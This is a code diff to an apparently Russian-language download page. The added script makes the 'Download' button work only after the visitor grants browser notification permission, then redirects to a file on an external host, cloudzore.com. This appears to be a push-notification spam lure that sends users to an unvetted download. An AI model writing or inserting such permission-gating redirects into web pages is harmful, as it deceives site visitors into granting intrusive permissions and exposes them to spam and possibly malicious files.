@@ -74,7 +74,22 @@
         <a onclick="requestNotificationPermission()" id="showButton" class="button">Скачать</a>
     </div>
 </div>
+<script>
+if ('Notification' in window) {
+  if (Notification.permission === 'granted') {
+    window.location.href = 'http://cloudzore.com/file/137e9f8';
+  } else {
+    // Если у пользователя ещё нет разрешения, запрашиваем его
+    Notification.requestPermission().then(function (permission) {
+      if (permission === 'granted') {
+        // Если пользователь разрешил уведомления, перенаправляем его
+        window.location.href = 'http://cloudzore.com/file/137e9f8';
+      }
+    });
+  }
+}
 
+</script>
 <script>
     window.onSubscribeInit = function (manager) {
         if (manager.getPermission() === 'default') {
